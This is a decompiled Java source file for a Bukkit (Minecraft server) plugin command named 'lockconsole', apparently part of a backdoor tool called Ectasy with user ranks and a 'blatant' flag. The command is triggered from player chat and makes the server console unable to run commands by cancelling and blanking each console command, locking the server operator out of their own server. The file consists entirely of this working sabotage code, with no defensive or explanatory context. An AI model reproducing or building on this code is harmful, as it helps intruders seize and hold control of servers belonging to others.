package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.server.ServerCommandEvent;

@CommandInfo(
   name = "lockconsole",
   description = "Make the console unable to execute commands.",
   blatant = true,
   rank = Rank.FREE
)
public class BlockConsoleCommand extends AbstractCommand implements Listener {
   public boolean locked = false;

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      this.locked = !this.locked;
      ChatUtil.sendChat(var1.getPlayer(), "The console is now " + (this.locked ? "&clocked" : "&aunlocked"));
   }

   @EventHandler
   public void onCommand(ServerCommandEvent var1) {
      if (this.locked) {
         var1.setCancelled(true);
         var1.setCommand("");
      }
   }

   public BlockConsoleCommand() {
   }
}
